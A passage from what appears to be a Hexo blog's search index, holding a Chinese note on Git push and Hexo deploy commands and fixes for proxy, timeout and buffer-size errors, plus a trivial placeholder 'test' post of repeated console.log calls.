        <content type="html"><![CDATA[<h1 id="推送到仓库"><a href="#推送到仓库" class="headerlink" title="推送到仓库"></a>推送到仓库</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git add .//添加所有文件到暂存区</span><br><span class="line"></span><br><span class="line">git commit -m &quot;别名&quot;//提交暂存区中的内容到本地仓库 -m 提交信息</span><br><span class="line"></span><br><span class="line">git branch -M main//重命名分支</span><br><span class="line"></span><br><span class="line">git push -u origin main//将本地仓库的文件Push到远程仓库</span><br></pre></td></tr></table></figure><h1 id="推送到网站"><a href="#推送到网站" class="headerlink" title="推送到网站"></a>推送到网站</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean //清除缓存</span><br><span class="line"></span><br><span class="line">hexo g//生成静态文件</span><br><span class="line"></span><br><span class="line">hexo d//推送到远程仓库</span><br></pre></td></tr></table></figure><h1 id="解决连接github出现443超时问题"><a href="#解决连接github出现443超时问题" class="headerlink" title="解决连接github出现443超时问题"></a>解决连接github出现443超时问题</h1><h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy</span><br></pre></td></tr></table></figure><h2 id="取消代理"><a href="#取消代理" class="headerlink" title="取消代理"></a>取消代理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure><h2 id="刷新dns缓存"><a href="#刷新dns缓存" class="headerlink" title="刷新dns缓存"></a>刷新dns缓存</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/flushdns</span><br></pre></td></tr></table></figure><h2 id="再次连接"><a href="#再次连接" class="headerlink" title="再次连接"></a>再次连接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/xxx/xxx</span><br></pre></td></tr></table></figure><h1 id="解决git-push推送时出现openSSL-read-Connection-was-aborted-error-10053问题"><a href="#解决git-push推送时出现openSSL-read-Connection-was-aborted-error-10053问题" class="headerlink" title="解决git push推送时出现openSSL_read:Connection was aborted,error 10053问题"></a>解决git push推送时出现openSSL_read:Connection was aborted,error 10053问题</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>Git默认限制推送的大小，默认好像是100M</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>运行命令更改限制大小即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.postBuffer 524288000</span><br></pre></td></tr></table></figure><h1 id="解决出现Failed-to-connect-to-127-0-0-1-port-7890-拒绝连接"><a href="#解决出现Failed-to-connect-to-127-0-0-1-port-7890-拒绝连接" class="headerlink" title="解决出现Failed to connect to 127.0.0.1 port 7890: 拒绝连接"></a>解决出现Failed to connect to 127.0.0.1 port 7890: 拒绝连接</h1><p>1、查看是否使用代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy</span><br></pre></td></tr></table></figure><p>然后它应该会显示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>2、将使用的代理取消掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前提知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2022/07/29/test/"/>
      <url>/2022/07/29/test/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function a()&#123;</span><br><span class="line">console.log(&quot;test&quot;)console.log(&quot;test&quot;)console.log(&quot;test&quot;)console.log(&quot;test&quot;)console.log(&quot;test&quot;)console.log(&quot;test&quot;)console.log(&quot;test&quot;)console.log(&quot;test&quot;)console.log(&quot;test&quot;)</span><br><span class="line">console.log(&quot;test&quot;)</span><br><span class="line">console.log(&quot;test&quot;)</span><br><span class="line">console.log(&quot;test&quot;)</span><br><span class="line">console.log(&quot;test&quot;)</span><br><span class="line">console.log(&quot;test&quot;)</span><br><span class="line">console.log(&quot;test&quot;)</span><br><span class="line">console.log(&quot;test&quot;)</span><br><span class="line">console.log(&quot;test&quot;)</span><br><span class="line">console.log(&quot;test&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
